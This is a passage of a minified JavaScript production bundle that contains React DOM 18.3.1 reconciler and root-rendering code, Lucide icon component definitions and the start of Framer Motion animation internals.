if(i.tag===1){var l=i.stateNode;if(typeof i.type.getDerivedStateFromError=="function"||typeof l.componentDidCatch=="function"&&(Ai===null||!Ai.has(l))){e=Nn(o,e),e=$h(i,e,1),i=Ti(i,e,1),e=lt(),i!==null&&(pr(i,1,e),ft(i,e));break}}i=i.return}}function Nv(e,i,o){var l=e.pingCache;l!==null&&l.delete(i),i=lt(),e.pingedLanes|=e.suspendedLanes&o,Qe===e&&(Ze&o)===o&&(Ge===4||Ge===3&&(Ze&130023424)===Ze&&500>Fe()-Hl?Yi(e,0):Wl|=o),ft(e,i)}function Pp(e,i){i===0&&((e.mode&1)===0?i=1:(i=Ss,Ss<<=1,(Ss&130023424)===0&&(Ss=4194304)));var o=lt();e=ni(e,i),e!==null&&(pr(e,i,o),ft(e,o))}function Fv(e){var i=e.memoizedState,o=0;i!==null&&(o=i.retryLane),Pp(e,o)}function zv(e,i){var o=0;switch(e.tag){case 13:var l=e.stateNode,u=e.memoizedState;u!==null&&(o=u.retryLane);break;case 19:l=e.stateNode;break;default:throw Error(r(314))}l!==null&&l.delete(i),Pp(e,o)}var Ep;Ep=function(e,i,o){if(e!==null)if(e.memoizedProps!==i.pendingProps||dt.current)ht=!0;else{if((e.lanes&o)===0&&(i.flags&128)===0)return ht=!1,Pv(e,i,o);ht=(e.flags&131072)!==0}else ht=!1,je&&(i.flags&1048576)!==0&&ah(i,Gs,i.index);switch(i.lanes=0,i.tag){case 2:var l=i.type;ao(e,i),e=i.pendingProps;var u=_n(i,tt.current);On(i,o),u=kl(null,i,l,e,u,o);var g=xl();return i.flags|=1,typeof u=="object"&&u!==null&&typeof u.render=="function"&&u.$$typeof===void 0?(i.tag=1,i.memoizedState=null,i.updateQueue=null,ut(l)?(g=!0,Ws(i)):g=!1,i.memoizedState=u.state!==null&&u.state!==void 0?u.state:null,fl(i),u.updater=so,i.stateNode=u,u._reactInternals=i,El(i,l,e,o),i=Dl(null,i,l,!0,g,o)):(i.tag=0,je&&g&&rl(i),at(null,i,u,o),i=i.child),i;case 16:l=i.elementType;e:{switch(ao(e,i),e=i.pendingProps,u=l._init,l=u(l._payload),i.type=l,u=i.tag=Vv(l),e=Nt(l,e),u){case 0:i=Rl(null,i,l,e,o);break e;case 1:i=ep(null,i,l,e,o);break e;case 11:i=Jh(null,i,l,e,o);break e;case 14:i=Qh(null,i,l,Nt(l.type,e),o);break e}throw Error(r(306,l,""))}return i;case 0:return l=i.type,u=i.pendingProps,u=i.elementType===l?u:Nt(l,u),Rl(e,i,l,u,o);case 1:return l=i.type,u=i.pendingProps,u=i.elementType===l?u:Nt(l,u),ep(e,i,l,u,o);case 3:e:{if(tp(i),e===null)throw Error(r(387));l=i.pendingProps,g=i.memoizedState,u=g.element,mh(e,i),Xs(i,l,null,o);var b=i.memoizedState;if(l=b.element,g.isDehydrated)if(g={element:l,isDehydrated:!1,cache:b.cache,pendingSuspenseBoundaries:b.pendingSuspenseBoundaries,transitions:b.transitions},i.updateQueue.baseState=g,i.memoizedState=g,i.flags&256){u=Nn(Error(r(423)),i),i=ip(e,i,l,o,u);break e}else if(l!==u){u=Nn(Error(r(424)),i),i=ip(e,i,l,o,u);break e}else for(wt=bi(i.stateNode.containerInfo.firstChild),vt=i,je=!0,Bt=null,o=fh(i,null,l,o),i.child=o;o;)o.flags=o.flags&-3|4096,o=o.sibling;else{if(Mn(),l===u){i=si(e,i,o);break e}at(e,i,l,o)}i=i.child}return i;case 5:return vh(i),e===null&&al(i),l=i.type,u=i.pendingProps,g=e!==null?e.memoizedProps:null,b=u.children,Xa(l,u)?b=null:g!==null&&Xa(l,g)&&(i.flags|=32),Zh(e,i),at(e,i,b,o),i.child;case 6:return e===null&&al(i),null;case 13:return np(e,i,o);case 4:return gl(i,i.stateNode.containerInfo),l=i.pendingProps,e===null?i.child=jn(i,null,l,o):at(e,i,l,o),i.child;case 11:return l=i.type,u=i.pendingProps,u=i.elementType===l?u:Nt(l,u),Jh(e,i,l,u,o);case 7:return at(e,i,i.pendingProps,o),i.child;case 8:return at(e,i,i.pendingProps.children,o),i.child;case 12:return at(e,i,i.pendingProps.children,o),i.child;case 10:e:{if(l=i.type._context,u=i.pendingProps,g=i.memoizedProps,b=u.value,Ee(Js,l._currentValue),l._currentValue=b,g!==null)if(Ot(g.value,b)){if(g.children===u.children&&!dt.current){i=si(e,i,o);break e}}else for(g=i.child,g!==null&&(g.return=i);g!==null;){var k=g.dependencies;if(k!==null){b=g.child;for(var A=k.firstContext;A!==null;){if(A.context===l){if(g.tag===1){A=ri(-1,o&-o),A.tag=2;var j=g.updateQueue;if(j!==null){j=j.shared;var F=j.pending;F===null?A.next=A:(A.next=F.next,F.next=A),j.pending=A}}g.lanes|=o,A=g.alternate,A!==null&&(A.lanes|=o),hl(g.return,o,i),k.lanes|=o;break}A=A.next}}else if(g.tag===10)b=g.type===i.type?null:g.child;else if(g.tag===18){if(b=g.return,b===null)throw Error(r(341));b.lanes|=o,k=b.alternate,k!==null&&(k.lanes|=o),hl(b,o,i),b=g.sibling}else b=g.child;if(b!==null)b.return=g;else for(b=g;b!==null;){if(b===i){b=null;break}if(g=b.sibling,g!==null){g.return=b.return,b=g;break}b=b.return}g=b}at(e,i,u.children,o),i=i.child}return i;case 9:return u=i.type,l=i.pendingProps.children,On(i,o),u=Et(u),l=l(u),i.flags|=1,at(e,i,l,o),i.child;case 14:return l=i.type,u=Nt(l,i.pendingProps),u=Nt(l.type,u),Qh(e,i,l,u,o);case 15:return Yh(e,i,i.type,i.pendingProps,o);case 17:return l=i.type,u=i.pendingProps,u=i.elementType===l?u:Nt(l,u),ao(e,i),i.tag=1,ut(l)?(e=!0,Ws(i)):e=!1,On(i,o),Vh(i,l,u),El(i,l,u,o),Dl(null,i,l,!0,e,o);case 19:return sp(e,i,o);case 22:return Xh(e,i,o)}throw Error(r(156,i.tag))};function Ip(e,i){return lu(e,i)}function Uv(e,i,o,l){this.tag=e,this.key=o,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=i,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=l,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Rt(e,i,o,l){return new Uv(e,i,o,l)}function Xl(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Vv(e){if(typeof e=="function")return Xl(e)?1:0;if(e!=null){if(e=e.$$typeof,e===H)return 11;if(e===he)return 14}return 2}function Ii(e,i){var o=e.alternate;return o===null?(o=Rt(e.tag,i,e.key,e.mode),o.elementType=e.elementType,o.type=e.type,o.stateNode=e.stateNode,o.alternate=e,e.alternate=o):(o.pendingProps=i,o.type=e.type,o.flags=0,o.subtreeFlags=0,o.deletions=null),o.flags=e.flags&14680064,o.childLanes=e.childLanes,o.lanes=e.lanes,o.child=e.child,o.memoizedProps=e.memoizedProps,o.memoizedState=e.memoizedState,o.updateQueue=e.updateQueue,i=e.dependencies,o.dependencies=i===null?null:{lanes:i.lanes,firstContext:i.firstContext},o.sibling=e.sibling,o.index=e.index,o.ref=e.ref,o}function vo(e,i,o,l,u,g){var b=2;if(l=e,typeof e=="function")Xl(e)&&(b=1);else if(typeof e=="string")b=5;else e:switch(e){case G:return Zi(o.children,u,g,i);case X:b=8,u|=8;break;case ne:return e=Rt(12,o,i,u|2),e.elementType=ne,e.lanes=g,e;case ae:return e=Rt(13,o,i,u),e.elementType=ae,e.lanes=g,e;case $:return e=Rt(19,o,i,u),e.elementType=$,e.lanes=g,e;case ue:return wo(o,u,g,i);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case ge:b=10;break e;case Ae:b=9;break e;case H:b=11;break e;case he:b=14;break e;case oe:b=16,l=null;break e}throw Error(r(130,e==null?e:typeof e,""))}return i=Rt(b,o,i,u),i.elementType=e,i.type=l,i.lanes=g,i}function Zi(e,i,o,l){return e=Rt(7,e,l,i),e.lanes=o,e}function wo(e,i,o,l){return e=Rt(22,e,l,i),e.elementType=ue,e.lanes=o,e.stateNode={isHidden:!1},e}function Zl(e,i,o){return e=Rt(6,e,null,i),e.lanes=o,e}function ec(e,i,o){return i=Rt(4,e.children!==null?e.children:[],e.key,i),i.lanes=o,i.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},i}function Wv(e,i,o,l,u){this.tag=i,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Pa(0),this.expirationTimes=Pa(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Pa(0),this.identifierPrefix=l,this.onRecoverableError=u,this.mutableSourceEagerHydrationData=null}function tc(e,i,o,l,u,g,b,k,A){return e=new Wv(e,i,o,k,A),i===1?(i=1,g===!0&&(i|=8)):i=0,g=Rt(3,null,null,i),e.current=g,g.stateNode=e,g.memoizedState={element:l,isDehydrated:o,cache:null,transitions:null,pendingSuspenseBoundaries:null},fl(g),e}function Hv(e,i,o){var l=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:J,key:l==null?null:""+l,children:e,containerInfo:i,implementation:o}}function _p(e){if(!e)return wi;e=e._reactInternals;e:{if(Ui(e)!==e||e.tag!==1)throw Error(r(170));var i=e;do{switch(i.tag){case 3:i=i.stateNode.context;break e;case 1:if(ut(i.type)){i=i.stateNode.__reactInternalMemoizedMergedChildContext;break e}}i=i.return}while(i!==null);throw Error(r(171))}if(e.tag===1){var o=e.type;if(ut(o))return rh(e,o,i)}return i}function Rp(e,i,o,l,u,g,b,k,A){return e=tc(o,l,!0,e,u,g,b,k,A),e.context=_p(null),o=e.current,l=lt(),u=Pi(o),g=ri(l,u),g.callback=i??null,Ti(o,g,u),e.current.lanes=u,pr(e,u,l),ft(e,l),e}function ko(e,i,o,l){var u=i.current,g=lt(),b=Pi(u);return o=_p(o),i.context===null?i.context=o:i.pendingContext=o,i=ri(g,b),i.payload={element:e},l=l===void 0?null:l,l!==null&&(i.callback=l),e=Ti(u,i,b),e!==null&&(Ut(e,u,b,g),Ys(e,u,b)),b}function xo(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Dp(e,i){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var o=e.retryLane;e.retryLane=o!==0&&o<i?o:i}}function ic(e,i){Dp(e,i),(e=e.alternate)&&Dp(e,i)}function $v(){return null}var Mp=typeof reportError=="function"?reportError:function(e){console.error(e)};function nc(e){this._internalRoot=e}To.prototype.render=nc.prototype.render=function(e){var i=this._internalRoot;if(i===null)throw Error(r(409));ko(e,i,null,null)},To.prototype.unmount=nc.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var i=e.containerInfo;Qi(function(){ko(null,e,null,null)}),i[Zt]=null}};function To(e){this._internalRoot=e}To.prototype.unstable_scheduleHydration=function(e){if(e){var i=mu();e={blockedOn:null,target:e,priority:i};for(var o=0;o<gi.length&&i!==0&&i<gi[o].priority;o++);gi.splice(o,0,e),o===0&&vu(e)}};function rc(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function So(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function jp(){}function Gv(e,i,o,l,u){if(u){if(typeof l=="function"){var g=l;l=function(){var j=xo(b);g.call(j)}}var b=Rp(i,l,e,0,null,!1,!1,"",jp);return e._reactRootContainer=b,e[Zt]=b.current,Pr(e.nodeType===8?e.parentNode:e),Qi(),b}for(;u=e.lastChild;)e.removeChild(u);if(typeof l=="function"){var k=l;l=function(){var j=xo(A);k.call(j)}}var A=tc(e,0,!1,null,null,!1,!1,"",jp);return e._reactRootContainer=A,e[Zt]=A.current,Pr(e.nodeType===8?e.parentNode:e),Qi(function(){ko(i,A,o,l)}),A}function Ao(e,i,o,l,u){var g=o._reactRootContainer;if(g){var b=g;if(typeof u=="function"){var k=u;u=function(){var A=xo(b);k.call(A)}}ko(i,b,e,u)}else b=Gv(o,i,e,u,l);return xo(b)}fu=function(e){switch(e.tag){case 3:var i=e.stateNode;if(i.current.memoizedState.isDehydrated){var o=hr(i.pendingLanes);o!==0&&(Ea(i,o|1),ft(i,Fe()),(we&6)===0&&(Un=Fe()+500,ki()))}break;case 13:Qi(function(){var l=ni(e,1);if(l!==null){var u=lt();Ut(l,e,1,u)}}),ic(e,1)}},Ia=function(e){if(e.tag===13){var i=ni(e,134217728);if(i!==null){var o=lt();Ut(i,e,134217728,o)}ic(e,134217728)}},gu=function(e){if(e.tag===13){var i=Pi(e),o=ni(e,i);if(o!==null){var l=lt();Ut(o,e,i,l)}ic(e,i)}},mu=function(){return Se},yu=function(e,i){var o=Se;try{return Se=e,i()}finally{Se=o}},ka=function(e,i,o){switch(i){case"input":if(pa(e,o),i=o.name,o.type==="radio"&&i!=null){for(o=e;o.parentNode;)o=o.parentNode;for(o=o.querySelectorAll("input[name="+JSON.stringify(""+i)+'][type="radio"]'),i=0;i<o.length;i++){var l=o[i];if(l!==e&&l.form===e.form){var u=Us(l);if(!u)throw Error(r(90));ua(l),pa(l,u)}}}break;case"textarea":Gd(e,o);break;case"select":i=o.value,i!=null&&bn(e,!!o.multiple,i,!1)}},tu=Jl,iu=Qi;var qv={usingClientEntryPoint:!1,Events:[_r,En,Us,Zd,eu,Jl]},Hr={findFiberByHostInstance:Vi,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Kv={bundleType:Hr.bundleType,version:Hr.version,rendererPackageName:Hr.rendererPackageName,rendererConfig:Hr.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:L.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=ou(e),e===null?null:e.stateNode},findFiberByHostInstance:Hr.findFiberByHostInstance||$v,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Co=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Co.isDisabled&&Co.supportsFiber)try{xs=Co.inject(Kv),Gt=Co}catch{}}return gt.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=qv,gt.createPortal=function(e,i){var o=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!rc(i))throw Error(r(200));return Hv(e,i,null,o)},gt.createRoot=function(e,i){if(!rc(e))throw Error(r(299));var o=!1,l="",u=Mp;return i!=null&&(i.unstable_strictMode===!0&&(o=!0),i.identifierPrefix!==void 0&&(l=i.identifierPrefix),i.onRecoverableError!==void 0&&(u=i.onRecoverableError)),i=tc(e,1,!1,null,null,o,!1,l,u),e[Zt]=i.current,Pr(e.nodeType===8?e.parentNode:e),new nc(i)},gt.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var i=e._reactInternals;if(i===void 0)throw typeof e.render=="function"?Error(r(188)):(e=Object.keys(e).join(","),Error(r(268,e)));return e=ou(i),e=e===null?null:e.stateNode,e},gt.flushSync=function(e){return Qi(e)},gt.hydrate=function(e,i,o){if(!So(i))throw Error(r(200));return Ao(null,e,i,!0,o)},gt.hydrateRoot=function(e,i,o){if(!rc(e))throw Error(r(405));var l=o!=null&&o.hydratedSources||null,u=!1,g="",b=Mp;if(o!=null&&(o.unstable_strictMode===!0&&(u=!0),o.identifierPrefix!==void 0&&(g=o.identifierPrefix),o.onRecoverableError!==void 0&&(b=o.onRecoverableError)),i=Rp(i,null,e,1,o??null,u,!1,g,b),e[Zt]=i.current,Pr(e),l)for(e=0;e<l.length;e++)o=l[e],u=o._getVersion,u=u(o._source),i.mutableSourceEagerHydrationData==null?i.mutableSourceEagerHydrationData=[o,u]:i.mutableSourceEagerHydrationData.push(o,u);return new To(i)},gt.render=function(e,i,o){if(!So(i))throw Error(r(200));return Ao(null,e,i,!1,o)},gt.unmountComponentAtNode=function(e){if(!So(e))throw Error(r(40));return e._reactRootContainer?(Qi(function(){Ao(null,null,e,!1,function(){e._reactRootContainer=null,e[Zt]=null})}),!0):!1},gt.unstable_batchedUpdates=Jl,gt.unstable_renderSubtreeIntoContainer=function(e,i,o,l){if(!So(o))throw Error(r(200));if(e==null||e._reactInternals===void 0)throw Error(r(38));return Ao(e,i,o,!1,l)},gt.version="18.3.1-next-f1338f8080-20240426",gt}var Vp;function wg(){if(Vp)return ac.exports;Vp=1;function n(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(n)}catch(t){console.error(t)}}return n(),ac.exports=nw(),ac.exports}var Wp;function rw(){if(Wp)return Po;Wp=1;var n=wg();return Po.createRoot=n.createRoot,Po.hydrateRoot=n.hydrateRoot,Po}var sw=rw();const ow=nd(sw);var aw={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const lw=n=>n.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase(),Ve=(n,t)=>{const r=S.forwardRef(({color:s="currentColor",size:a=24,strokeWidth:c=2,absoluteStrokeWidth:d,children:h,...p},f)=>S.createElement("svg",{ref:f,...aw,width:a,height:a,stroke:s,strokeWidth:d?Number(c)*24/Number(a):c,className:`lucide lucide-${lw(n)}`,...p},[...t.map(([m,y])=>S.createElement(m,y)),...(Array.isArray(h)?h:[h])||[]]));return r.displayName=`${n}`,r},cw=Ve("AlertTriangle",[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z",key:"c3ski4"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]]),dw=Ve("Archive",[["rect",{width:"20",height:"5",x:"2",y:"3",rx:"1",key:"1wp1u1"}],["path",{d:"M4 8v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8",key:"1s80jp"}],["path",{d:"M10 12h4",key:"a56b0p"}]]),uw=Ve("ArrowLeft",[["path",{d:"m12 19-7-7 7-7",key:"1l729n"}],["path",{d:"M19 12H5",key:"x3x0zl"}]]),kg=Ve("ArrowRight",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"m12 5 7 7-7 7",key:"xquz4c"}]]),xg=Ve("CalendarDays",[["rect",{width:"18",height:"18",x:"3",y:"4",rx:"2",ry:"2",key:"eu3xkr"}],["line",{x1:"16",x2:"16",y1:"2",y2:"6",key:"m3sa8f"}],["line",{x1:"8",x2:"8",y1:"2",y2:"6",key:"18kwsl"}],["line",{x1:"3",x2:"21",y1:"10",y2:"10",key:"xt86sb"}],["path",{d:"M8 14h.01",key:"6423bh"}],["path",{d:"M12 14h.01",key:"1etili"}],["path",{d:"M16 14h.01",key:"1gbofw"}],["path",{d:"M8 18h.01",key:"lrp35t"}],["path",{d:"M12 18h.01",key:"mhygvu"}],["path",{d:"M16 18h.01",key:"kzsmim"}]]),hw=Ve("ChevronLeft",[["path",{d:"m15 18-6-6 6-6",key:"1wnfg3"}]]),pw=Ve("ChevronRight",[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]]),fw=Ve("Eye",[["path",{d:"M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z",key:"rwhkz3"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]]),gw=Ve("Github",[["path",{d:"M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4",key:"tonef"}],["path",{d:"M9 18c-4.51 2-5-2-7-2",key:"9comsn"}]]),mw=Ve("Heart",[["path",{d:"M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z",key:"c3ymky"}]]),yw=Ve("Home",[["path",{d:"m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",key:"y5dka4"}],["polyline",{points:"9 22 9 12 15 12 15 22",key:"e2us08"}]]),bw=Ve("Linkedin",[["path",{d:"M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z",key:"c2jq9f"}],["rect",{width:"4",height:"12",x:"2",y:"9",key:"mk3on5"}],["circle",{cx:"4",cy:"4",r:"2",key:"bt5ra8"}]]),vw=Ve("MessageSquare",[["path",{d:"M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z",key:"1lielz"}]]),Tg=Ve("Search",[["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}],["path",{d:"m21 21-4.3-4.3",key:"1qie3q"}]]),ww=Ve("Send",[["path",{d:"m22 2-7 20-4-9-9-4Z",key:"1q3vgg"}],["path",{d:"M22 2 11 13",key:"nzbqef"}]]),kw=Ve("Tag",[["path",{d:"M12 2H2v10l9.29 9.29c.94.94 2.48.94 3.42 0l6.58-6.58c.94-.94.94-2.48 0-3.42L12 2Z",key:"14b2ls"}],["path",{d:"M7 7h.01",key:"7u93v4"}]]),xw=Ve("Trash2",[["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6",key:"4alrt4"}],["path",{d:"M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2",key:"v07s0e"}],["line",{x1:"10",x2:"10",y1:"11",y2:"17",key:"1uufr5"}],["line",{x1:"14",x2:"14",y1:"11",y2:"17",key:"xtxkd"}]]),Tw=Ve("Twitter",[["path",{d:"M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z",key:"pff0z6"}]]),Sg=Ve("UserCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"10",r:"3",key:"ilqhr7"}],["path",{d:"M7 20.662V19a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v1.662",key:"154egf"}]]),Vo=Ve("XCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m15 9-6 6",key:"1uzhvr"}],["path",{d:"m9 9 6 6",key:"z0biqf"}]]),Sw=Ve("X",[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]]),Ag=S.createContext({transformPagePoint:n=>n,isStatic:!1,reducedMotion:"never"}),Zo=S.createContext({}),ea=S.createContext(null),ta=typeof document<"u",sd=ta?S.useLayoutEffect:S.useEffect,Cg=S.createContext({strict:!1}),od=n=>n.replace(/([a-z])([A-Z])/g,"$1-$2").toLowerCase(),Aw="framerAppearId",Pg="data-"+od(Aw);function Cw(n,t,r,s){const{visualElement:a}=S.useContext(Zo),c=S.useContext(Cg),d=S.useContext(ea),h=S.useContext(Ag).reducedMotion,p=S.useRef();s=s||c.renderer,!p.current&&s&&(p.current=s(n,{visualState:t,parent:a,props:r,presenceContext:d,blockInitialAnimation:d?d.initial===!1:!1,reducedMotionConfig:h}));const f=p.current;S.useInsertionEffect(()=>{f&&f.update(r,d)});const m=S.useRef(!!(r[Pg]&&!window.HandoffComplete));return sd(()=>{f&&(f.render(),m.current&&f.animationState&&f.animationState.animateChanges())}),S.useEffect(()=>{f&&(f.updateFeatures(),!m.current&&f.animationState&&f.animationState.animateChanges(),m.current&&(m.current=!1,window.HandoffComplete=!0))}),f}function Qn(n){return n&&typeof n=="object"&&Object.prototype.hasOwnProperty.call(n,"current")}function Pw(n,t,r){return S.useCallback(s=>{s&&n.mount&&n.mount(s),t&&(s?t.mount(s):t.unmount()),r&&(typeof r=="function"?r(s):Qn(r)&&(r.current=s))},[t])}function os(n){return typeof n=="string"||Array.isArray(n)}function ia(n){return n!==null&&typeof n=="object"&&typeof n.start=="function"}const ad=["animate","whileInView","whileFocus","whileHover","whileTap","whileDrag","exit"],ld=["initial",...ad];function na(n){return ia(n.animate)||ld.some(t=>os(n[t]))}function Eg(n){return!!(na(n)||n.variants)}function Ew(n,t){if(na(n)){const{initial:r,animate:s}=n;return{initial:r===!1||os(r)?r:void 0,animate:os(s)?s:void 0}}return n.inherit!==!1?t:{}}function Iw(n){const{initial:t,animate:r}=Ew(n,S.useContext(Zo));return S.useMemo(()=>({initial:t,animate:r}),[Hp(t),Hp(r)])}function Hp(n){return Array.isArray(n)?n.join(" "):n}const $p={animation:["animate","variants","whileHover","whileTap","exit","whileInView","whileFocus","whileDrag"],exit:["exit"],drag:["drag","dragControls"],focus:["whileFocus"],hover:["whileHover","onHoverStart","onHoverEnd"],tap:["whileTap","onTap","onTapStart","onTapCancel"],pan:["onPan","onPanStart","onPanSessionStart","onPanEnd"],inView:["whileInView","onViewportEnter","onViewportLeave"],layout:["layout","layoutId"]},as={};for(const n in $p)as[n]={isEnabled:t=>$p[n].some(r=>!!t[r])};function _w(n){for(const t in n)as[t]={...as[t],...n[t]}}const cd=S.createContext({}),Ig=S.createContext({}),Rw=Symbol.for("motionComponentSymbol");function Dw({preloadedFeatures:n,createVisualElement:t,useRender:r,useVisualState:s,Component:a}){n&&_w(n);function c(h,p){let f;const m={...S.useContext(Ag),...h,layoutId:Mw(h)},{isStatic:y}=m,v=Iw(h),w=s(h,y);if(!y&&ta){v.visualElement=Cw(a,w,m,t);const E=S.useContext(Ig),T=S.useContext(Cg).strict;v.visualElement&&(f=v.visualElement.loadFeatures(m,T,n,E))}return S.createElement(Zo.Provider,{value:v},f&&v.visualElement?S.createElement(f,{visualElement:v.visualElement,...m}):null,r(a,h,Pw(w,v.visualElement,p),w,y,v.visualElement))}const d=S.forwardRef(c);return d[Rw]=a,d}function Mw({layoutId:n}){const t=S.useContext(cd).id;return t&&n!==void 0?t+"-"+n:n}function jw(n){function t(s,a={}){return Dw(n(s,a))}if(typeof Proxy>"u")return t;const r=new Map;return new Proxy(t,{get:(s,a)=>(r.has(a)||r.set(a,t(a)),r.get(a))})}const Lw=["animate","circle","defs","desc","ellipse","g","image","line","filter","marker","mask","metadata","path","pattern","polygon","polyline","rect","stop","switch","symbol","svg","text","tspan","use","view"];function dd(n){return typeof n!="string"||n.includes("-")?!1:!!(Lw.indexOf(n)>-1||/[A-Z]/.test(n))}const Wo={};function Ow(n){Object.assign(Wo,n)}const us=["transformPerspective","x","y","z","translateX","translateY","translateZ","scale","scaleX","scaleY","rotate","rotateX","rotateY","rotateZ","skew","skewX","skewY"],fn=new Set(us);function _g(n,{layout:t,layoutId:r}){return fn.has(n)||n.startsWith("origin")||(t||r!==void 0)&&(!!Wo[n]||n==="opacity")}const mt=n=>!!(n&&n.getVelocity),Bw={x:"translateX",y:"translateY",z:"translateZ",transformPerspective:"perspective"},Nw=us.length;function Fw(n,{enableHardwareAcceleration:t=!0,allowTransformNone:r=!0},s,a){let c="";for(let d=0;d<Nw;d++){const h=us[d];if(n[h]!==void 0){const p=Bw[h]||h;c+=`${p}(${n[h]}) `}}return t&&!n.z&&(c+="translateZ(0)"),c=c.trim(),a?c=a(n,s?"":c):r&&s&&(c="none"),c}const Rg=n=>t=>typeof t=="string"&&t.startsWith(n),Dg=Rg("--"),jc=Rg("var(--"),zw=/var\s*\(\s*--[\w-]+(\s*,\s*(?:(?:[^)(]|\((?:[^)(]+|\([^)(]*\))*\))*)+)?\s*\)/g,Uw=(n,t)=>t&&typeof n=="number"?t.transform(n):n,Bi=(n,t,r)=>Math.min(Math.max(r,n),t),gn={test:n=>typeof n=="number",parse:parseFloat,transform:n=>n},Zr={...gn,transform:n=>Bi(0,1,n)},Eo={...gn,default:1},es=n=>Math.round(n*1e5)/1e5,ra=/(-)?([\d]*\.?[\d])+/g,Mg=/(#[0-9a-f]{3,8}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2}(-?[\d\.]+%?)\s*[\,\/]?\s*[\d\.]*%?\))/gi,Vw=/^(#[0-9a-f]{3,8}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2}(-?[\d\.]+%?)\s*[\,\/]?\s*[\d\.]*%?\))$/i;function hs(n){return typeof n=="string"}const ps=n=>({test:t=>hs(t)&&t.endsWith(n)&&t.split(" 